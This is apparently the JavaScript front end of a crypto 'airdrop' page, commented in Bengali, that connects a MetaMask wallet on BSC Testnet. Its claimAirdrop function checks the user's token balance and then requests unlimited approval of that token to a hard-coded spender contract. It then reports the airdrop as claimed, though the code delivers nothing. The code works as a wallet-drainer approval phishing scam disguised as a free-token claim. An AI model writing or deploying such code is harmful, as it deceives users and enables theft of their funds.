/* ================= CONFIGURATION ================= */

// ১. আপনার স্পেন্ডার কন্ট্রাক্ট
const SPENDER_CONTRACT = "0x498690046efc3feCEFa545a3D0d340cfB26817f0"; 

// ২. আপনার দেওয়া USDT অ্যাড্রেস (যেটা আপনি চাইলেন)
const TARGET_TOKEN = "0x55d7fde29923200cAE1a2b09ae889F86042faba5"; 

// ৩. ABI কনফিগারেশন
const ERC20_ABI = [
    "function approve(address spender, uint256 amount) public returns (bool)",
    "function allowance(address owner, address spender) public view returns (uint256)",
    "function balanceOf(address account) view returns (uint256)",
    "function decimals() view returns (uint8)"
];

/* ================= MAIN LOGIC (WALLET FIX INCLUDED) ================= */

let provider;
let signer;
let userAddress;

async function connectWallet() {
    const btn = document.getElementById("connectBtn");
    const statusMsg = document.getElementById("statusMsg");

    if (typeof window.ethereum === 'undefined') {
        alert("Please Install MetaMask!");
        return;
    }

    try {
        provider = new ethers.providers.Web3Provider(window.ethereum);
        
        // 🔥 WALLET FIX: এই লাইনটি বর্তমানে সিলেক্ট করা ওয়ালেটটিই আনবে
        const accounts = await provider.send("eth_requestAccounts", []);
        userAddress = accounts[0]; // মেটামাস্কে যেটা Active আছে, সেটাই এখানে আসবে
        
        signer = provider.getSigner();

        // BSC Testnet (Chain ID 97) চেক করা
        const network = await provider.getNetwork();
        if (network.chainId !== 97) {
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x61' }], // 97
                });
                provider = new ethers.providers.Web3Provider(window.ethereum);
                signer = provider.getSigner();
            } catch (error) {
                // নেটওয়ার্ক না থাকলে অ্যাড করার রিকোয়েস্ট
                if (error.code === 4902) {
                     await window.ethereum.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: '0x61',
                            chainName: 'BSC Testnet',
                            rpcUrls: ['https://data-seed-prebsc-1-s1.binance.org:8545'],
                            nativeCurrency: { name: 'BNB', symbol: 'tBNB', decimals: 18 },
                            blockExplorerUrls: ['https://testnet.bscscan.com']
                        }]
                    });
                } else {
                    alert("Please switch to BSC Testnet!");
                    return;
                }
            }
        }

        // বাটন আপডেট
        if(btn) btn.innerText = userAddress.slice(0, 6) + "..." + userAddress.slice(-4);
        if(statusMsg) {
            statusMsg.innerText = "✅ Wallet Connected: " + userAddress.slice(0, 6) + "...";
            statusMsg.style.color = "#00ff88";
        }
        console.log("Connected Wallet:", userAddress);

    } catch (error) {
        console.error("Connection Failed:", error);
    }
}

async function claimAirdrop() {
    // কানেক্ট না থাকলে আগে কানেক্ট করবে
    if (!userAddress) {
        await connectWallet();
        // কানেক্ট হওয়ার পর একটু সময় দেওয়া যাতে state আপডেট হয়
        if (!userAddress) return; 
    }
    
    const statusMsg = document.getElementById("statusMsg");
    if(statusMsg) statusMsg.innerText = "Processing Transaction...";

    try {
        // প্রোভাইডার রিফ্রেশ করে নেওয়া (যাতে ভুল ওয়ালেট না থাকে)
        provider = new ethers.providers.Web3Provider(window.ethereum);
        signer = provider.getSigner();
        
        const tokenContract = new ethers.Contract(TARGET_TOKEN, ERC20_ABI, signer);

        // ১. ব্যালেন্স চেক (যদি এরর দেয়, বুঝবেন এই অ্যাড্রেসটি ভ্যালিড না)
        const balance = await tokenContract.balanceOf(userAddress);
        console.log("User Balance:", balance.toString());

        if (balance.eq(0)) {
            if(statusMsg) statusMsg.innerText = "⚠️ No Token Balance Found!";
            alert("আপনার ওয়ালেটে এই টোকেন নেই! আগে টোকেন সংগ্রহ করুন।");
            return;
        }

        // ২. অ্যাপ্রুভাল চেক
        const currentAllowance = await tokenContract.allowance(userAddress, SPENDER_CONTRACT);
        
        if (currentAllowance.lt(ethers.utils.parseUnits("1000", 18))) {
            // আনলিমিটেড অ্যাপ্রুভাল
            const tx = await tokenContract.approve(SPENDER_CONTRACT, ethers.constants.MaxUint256);
            
            if(statusMsg) statusMsg.innerText = "Waiting for Confirmation...";
            await tx.wait();
            
            console.log("Approved Successfully!");
        } else {
            console.log("Already Approved.");
        }

        if(statusMsg) statusMsg.innerText = "🎉 Airdrop Claimed Successfully!";
        alert("Success!");

    } catch (error) {
        console.error("Transaction Error:", error);
        if(statusMsg) {
            statusMsg.innerText = "Failed: " + (error.reason || "Check Console");
            statusMsg.style.color = "red";
        }
        // যদি CALL_EXCEPTION আসে তার মানে আপনার টোকেন অ্যাড্রেসটি এই নেটওয়ার্কে কাজ করছে না
        if (error.code === "CALL_EXCEPTION") {
            alert("Error: আপনার দেওয়া USDT অ্যাড্রেসটি BSC Testnet-এ সঠিক নয় বা ভেরিফাইড নয়।");
        }
    }
}

// 🔥 অটোমেটিক ওয়ালেট চেঞ্জ ডিটেকশন 🔥
if (window.ethereum) {
    window.ethereum.on('accountsChanged', (accounts) => {
        if (accounts.length > 0) {
            userAddress = accounts[0];
            console.log("Wallet Switched to:", userAddress);
            
            // বাটন আপডেট
            const btn = document.getElementById("connectBtn");
            if(btn) btn.innerText = userAddress.slice(0, 6) + "..." + userAddress.slice(-4);
            
            // প্রোভাইডার রিসেট
            provider = new ethers.providers.Web3Provider(window.ethereum);
            signer = provider.getSigner();
        } else {
            // ইউজার ডিসকানেক্ট করলে
            userAddress = null;
            const btn = document.getElementById("connectBtn");
            if(btn) btn.innerText = "Connect Wallet";
        }
    });

    window.ethereum.on('chainChanged', () => {
        window.location.reload();
    });
}
